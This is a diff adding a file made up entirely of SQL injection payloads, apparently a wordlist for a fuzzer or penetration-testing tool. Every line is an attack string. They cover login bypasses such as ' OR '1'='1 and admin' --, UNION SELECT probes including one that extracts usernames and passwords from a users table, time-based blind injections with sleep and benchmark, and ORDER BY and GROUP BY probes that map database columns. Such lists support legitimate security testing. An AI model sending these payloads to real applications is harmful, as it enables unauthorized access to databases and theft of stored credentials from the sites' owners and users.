@@ -1,0 +1,33 @@
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR 'a'='a
+' OR ''='
+admin' --
+admin' #
+admin'/*
+' OR 1=1#
+' OR 1=1/*
+' OR '1'='1'#
+' OR '1'='1'/*
+') OR '1'='1
+") OR ("1"="1
+') OR ('a'='a
+' OR 1=1 LIMIT 1--
+' UNION SELECT null--
+' UNION SELECT null,null--
+' UNION SELECT null,null,null--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT @@version--
+' OR sleep(5)--
+' OR benchmark(10000000,md5(1))--
+admin' OR '1'='1
+admin' OR 1=1--
+' OR EXISTS(SELECT * FROM users)--
+' AND 1=1--
+' AND 1=2--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' GROUP BY password HAVING 1=1--
+' OR '1'='1' AND ''='
